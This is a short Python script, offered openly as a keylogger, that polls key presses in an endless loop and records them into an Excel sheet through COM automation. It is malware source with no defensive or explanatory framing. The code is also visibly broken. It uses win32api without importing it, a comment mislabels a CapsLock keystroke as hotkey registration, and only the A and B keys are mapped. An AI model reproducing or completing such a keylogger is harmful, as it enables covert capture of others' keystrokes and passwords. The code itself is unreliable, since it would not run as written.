import os, sys, time, win32com.client

# Create a new Excel document to log keystrokes
excel = win32com.client.Dispatch("Excel.Application")
wb = excel.Workbooks.Add()
ws = wb.ActiveSheet

# Function to log keystrokes
def log_keystroke(key):
    ws.Cells(ws.Rows.Count, 1).End(-4162).Offset(1, 0).Value = key

# Register hotkeys for logging
win32com.client.Dispatch("WScript.Shell").SendKeys("{CAPSLOCK}")

while True:
    # Check if any keys are pressed
    if win32api.GetAsyncKeyState(ord('A')):
        log_keystroke('A')
    elif win32api.GetAsyncKeyState(ord('B')):
        log_keystroke('B')
    # Add more key mappings as needed

    time.sleep(0.1)
